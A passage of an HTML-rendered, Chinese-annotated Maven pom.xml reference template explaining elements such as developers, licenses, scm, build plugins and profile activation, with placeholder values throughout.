class="name">roles</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--项目开发者所属组织 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">organization</span>&gt;</span>demo<span class="tag">&lt;/<span class="name">organization</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--项目开发者所属组织的URL --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">organizationUrl</span>&gt;</span>http://hi.baidu.com/banseon<span class="tag">&lt;/<span class="name">organizationUrl</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--项目开发者属性，如即时消息如何处理等 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dept</span>&gt;</span>No<span class="tag">&lt;/<span class="name">dept</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--项目开发者所在时区， -11到12范围内的整数。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">timezone</span>&gt;</span>-5<span class="tag">&lt;/<span class="name">timezone</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">developer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">developers</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目的其他贡献者列表 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">contributors</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--项目的其他贡献者。参见developers/developer元素 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">contributor</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">email</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">organization</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">organizationUrl</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">roles</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">timezone</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">properties</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">contributor</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">contributors</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--该元素描述了项目所有License列表。 应该只列出该项目的license列表，不要列出依赖项目的 license列表。如果列出多个license，用户可以选择它们中的一个而不是接受所有license。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">licenses</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--描述了项目的license，用于生成项目的web站点的license页面，其他一些报表和validation也会用到该元素。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">license</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--license用于法律上的名称 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>Apache 2<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--官方的license正文页面的URL --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://www.baidu.com/banseon/LICENSE-2.0.txt<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--项目分发的主要方式： repo，可以从Maven库下载 manual， 用户必须手动下载和安装依赖 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">distribution</span>&gt;</span>repo<span class="tag">&lt;/<span class="name">distribution</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--关于license的补充信息 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">comments</span>&gt;</span>A business-friendly OSS license<span class="tag">&lt;/<span class="name">comments</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">license</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">licenses</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--SCM(Source Control Management)标签允许你配置你的代码库，供Maven web站点和其它插件使用。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scm</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--SCM的URL,该URL描述了版本库和如何连接到版本库。欲知详情，请看SCMs提供的URL格式和列表。该连接只读。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">connection</span>&gt;</span></span><br><span class="line">            scm:svn:http://svn.baidu.com/banseon/maven/banseon/banseon-maven2-trunk(dao-trunk)</span><br><span class="line">        <span class="tag">&lt;/<span class="name">connection</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--给开发者使用的，类似connection元素。即该连接不仅仅只读 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">developerConnection</span>&gt;</span></span><br><span class="line">            scm:svn:http://svn.baidu.com/banseon/maven/banseon/dao-trunk</span><br><span class="line">        <span class="tag">&lt;/<span class="name">developerConnection</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--当前代码的标签，在开发阶段默认为HEAD --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tag</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--指向项目的可浏览SCM库（例如ViewVC或者Fisheye）的URL。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://svn.baidu.com/banseon<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">scm</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--描述项目所属组织的各种属性。Maven产生的文档用 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">organization</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--组织的全名 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>demo<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--组织主页的URL --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://www.baidu.com/banseon<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">organization</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--构建项目需要的信息 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--该元素设置了项目源码目录，当构建项目的时候，构建系统会编译目录里的源码。该路径是相对于pom.xml的相对路径。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sourceDirectory</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--该元素设置了项目脚本源码目录，该目录和源码目录不同：绝大多数情况下，该目录下的内容 会被拷贝到输出目录(因为脚本是被解释的，而不是被编译的)。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scriptSourceDirectory</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--该元素设置了项目单元测试使用的源码目录，当测试项目的时候，构建系统会编译目录里的源码。该路径是相对于pom.xml的相对路径。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">testSourceDirectory</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--被编译过的应用程序class文件存放的目录。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">outputDirectory</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--被编译过的测试class文件存放的目录。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">testOutputDirectory</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--使用来自该项目的一系列构建扩展 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">extensions</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--描述使用到的构建扩展。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">extension</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--构建扩展的groupId --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--构建扩展的artifactId --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--构建扩展的版本 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">extension</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">extensions</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--当项目没有规定目标（Maven2 叫做阶段）时的默认值 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">defaultGoal</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--这个元素描述了项目相关的所有资源路径列表，例如和项目相关的属性文件，这些资源被包含在最终的打包文件里。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--这个元素描述了项目相关或测试相关的所有资源路径 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 描述了资源的目标路径。该路径相对target/classes目录（例如$&#123;project.build.outputDirectory&#125;）。举个例 </span></span><br><span class="line"><span class="comment">                    子，如果你想资源在特定的包里(org.apache.maven.messages)，你就必须该元素设置为org/apache/maven /messages。然而，如果你只是想把资源放到源码目录结构里，就不需要该配置。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">targetPath</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--是否使用参数值代替参数名。参数值取自properties元素或者文件里配置的属性，文件在filters元素里列出。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">filtering</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--描述存放资源的目录，该路径相对POM路径 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--包含的模式列表，例如**/*.xml. --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">includes</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--排除的模式列表，例如**/*.xml --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">excludes</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--这个元素描述了单元测试相关的所有资源路径，例如和单元测试相关的属性文件。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">testResources</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--这个元素描述了测试相关的所有资源路径，参见build/resources/resource元素的说明 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">testResource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">targetPath</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">filtering</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">includes</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">excludes</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">testResource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">testResources</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--构建产生的所有文件存放的目录 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directory</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--产生的构件的文件名，默认值是$&#123;artifactId&#125;-$&#123;version&#125;。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">finalName</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--当filtering开关打开时，使用到的过滤器属性文件列表 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filters</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--子项目可以引用的默认插件信息。该插件配置项直到被引用时才会被解析或绑定到生命周期。给定插件的任何本地配置都会覆盖这里的配置 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--使用的插件列表 。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--plugin元素包含描述插件所需要的信息。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--插件在仓库里的group ID --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span> /&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--插件在仓库里的artifact ID --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span> /&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--被使用的插件的版本（或版本范围） --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span> /&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--是否从该插件下载Maven扩展（例如打包和类型处理器），由于性能原因，只有在真需要下载时，该元素才被设置成enabled。 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">extensions</span> /&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--在构建生命周期中执行一组目标的配置。每个目标可能有不同的配置。 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!--execution元素包含了插件执行需要的信息 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                            <span class="comment">&lt;!--执行目标的标识符，用于标识构建过程中的目标，或者匹配继承过程中需要合并的执行目标 --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">id</span> /&gt;</span></span><br><span class="line">                            <span class="comment">&lt;!--绑定了目标的构建生命周期阶段，如果省略，目标会被绑定到源数据里配置的默认阶段 --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">phase</span> /&gt;</span></span><br><span class="line">                            <span class="comment">&lt;!--配置的执行目标 --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goals</span> /&gt;</span></span><br><span class="line">                            <span class="comment">&lt;!--配置是否被传播到子POM --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                            <span class="comment">&lt;!--作为DOM对象的配置 --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--项目引入插件所需要的额外依赖 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!--参见dependencies/dependency元素 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                            ......</span><br><span class="line">                        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--任何配置是否被传播到子项目 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--作为DOM对象的配置 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--使用的插件列表 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--参见build/pluginManagement/plugins/plugin元素 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">extensions</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--参见dependencies/dependency元素 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                        ......</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">goals</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--在列的项目构建profile，如果被激活，会修改构建处理 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">profiles</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--根据环境参数或命令行参数激活某个构建处理 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--构建配置的唯一标识符。即用于命令行激活，也用于在继承时合并具有相同标识符的profile。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span> /&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--自动触发profile的条件逻辑。Activation是profile的开启钥匙。profile的力量来自于它 能够在某些特定的环境中自动使用某些特定的值；这些环境通过activation元素指定。activation元素并不是激活profile的唯一方式。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--profile默认是否激活的标志 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">activeByDefault</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--当匹配的jdk被检测到，profile被激活。例如，1.4激活JDK1.4，1.4.0_2，而!1.4激活所有版本不是以1.4开头的JDK。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jdk</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--当匹配的操作系统属性被检测到，profile被激活。os元素可以定义一些操作系统相关的属性。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">os</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--激活profile的操作系统的名字 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Windows XP<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--激活profile的操作系统所属家族(如 &#x27;windows&#x27;) --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">family</span>&gt;</span>Windows<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--激活profile的操作系统体系结构 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">arch</span>&gt;</span>x86<span class="tag">&lt;/<span class="name">arch</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--激活profile的操作系统版本 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.2600<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">os</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--如果Maven检测到某一个属性（其值可以在POM中通过$&#123;名称&#125;引用），其拥有对应的名称和值，Profile就会被激活。如果值 字段是空的，那么存在属性名称字段就会激活profile，否则按区分大小写方式匹配属性值字段 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--激活profile的属性的名称 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>mavenVersion<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--激活profile的属性的值 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">value</span>&gt;</span>2.0.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--提供一个文件名，通过检测该文件的存在或不存在来激活profile。missing检查文件是否存在，如果不存在则激活 profile。另一方面，exists则会检查文件是否存在，如果存在则激活profile。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">file</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--如果指定的文件存在，则激活profile。 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">exists</span>&gt;</span>/usr/local/hudson/hudson-home/jobs/maven-guide-zh-to-production/workspace/</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">exists</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--如果指定的文件不存在，则激活profile。 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">missing</span>&gt;</span>/usr/local/hudson/hudson-home/jobs/maven-guide-zh-to-production/workspace/</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">missing</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--构建项目所需要的信息。参见build元素 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">defaultGoal</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">targetPath</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">filtering</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">directory</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">includes</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">excludes</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">testResources</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">testResource</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">targetPath</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">filtering</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">directory</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">includes</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">excludes</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">testResource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">testResources</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">finalName</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">filters</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!--参见build/pluginManagement/plugins/plugin元素 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">groupId</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">artifactId</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">version</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">extensions</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">id</span> /&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">phase</span> /&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">goals</span> /&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                                <span class="comment">&lt;!--参见dependencies/dependency元素 --&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                                    ......</span><br><span class="line">                                <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goals</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--参见build/pluginManagement/plugins/plugin元素 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">groupId</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">artifactId</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">version</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">extensions</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">id</span> /&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">phase</span> /&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">goals</span> /&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                            <span class="comment">&lt;!--参见dependencies/dependency元素 --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                                ......</span><br><span class="line">                            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">                    <span 